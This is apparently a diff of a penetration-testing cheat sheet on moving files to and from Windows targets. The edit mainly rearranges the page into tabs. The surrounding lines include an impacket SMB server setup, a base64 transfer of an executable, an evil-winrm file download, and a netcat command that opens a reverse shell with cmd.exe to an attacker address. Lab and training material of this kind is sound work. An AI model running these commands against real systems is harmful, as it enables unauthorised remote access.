@@ -5,15 +5,24 @@ tags: ["file transfer", "Windows", "smb", "evil-winrm"]
 ---
 
 ---
-### SMB
+{{< tab set1 tab1 active >}}SMB{{< /tab >}}
+{{< tab set1 tab2 >}}Base64{{< /tab >}}
+{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
 #### Start a Local SMB Server
+
+<div>
 
 ```bash
 impacket-smbserver share . -smb2support
 ```
 
+</div>
+
 #### cmd
+
+<div>
 
 ```powershell
 # Connect to SMB server without creds
@@ -50,11 +59,14 @@ net use /d \\10.10.14.10\share
 \\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
 ```
 
-<br>
+</div>
 
----
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
-### Base64 Encoding (for small binary)
+#### Small binary
+
+<div>
 
 ```powershell
 # In target Windows
@@ -68,13 +80,20 @@ echo -n '<BASE64_BINARY>' | base64 -d > example.exe
 
 <small>*Note: For restricted environment*</small>
 
----
+</div>
 
-### Evil-winrm
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
+
+<div>
 
 ```bash
 # Evil-winrm built-in function
 download "C:\ProgramData\example.txt" "/tmp/example.txt"
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
